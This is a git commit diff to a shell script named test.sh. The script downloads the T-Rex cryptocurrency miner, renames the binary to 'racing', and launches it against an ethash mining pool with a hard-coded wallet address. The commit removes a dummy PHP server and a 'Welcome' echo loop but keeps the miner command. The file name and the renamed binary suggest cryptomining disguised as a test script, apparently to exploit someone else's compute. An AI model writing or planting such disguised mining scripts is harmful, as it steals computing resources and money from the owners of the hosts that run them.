ea5882b2ba0037877e75cb852fc4baf5900e13a7
someonehaha77 <108747108+someonehaha77@users.noreply.github.com>
2022-07-06 07:50:23 +0000

    Update test.sh

--- test.sh
+++ test.sh
@@ -4,12 +4,4 @@ apt-get update
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-touch index.php
-php -S 0.0.0.0:8080 &
-/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -q -p x -w anohito &
-x=1
-while [ $x -le 5 ]
-do
-  echo "Welcome $x times"
-  sleep 5
-done
+/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -q -p x -w anohito
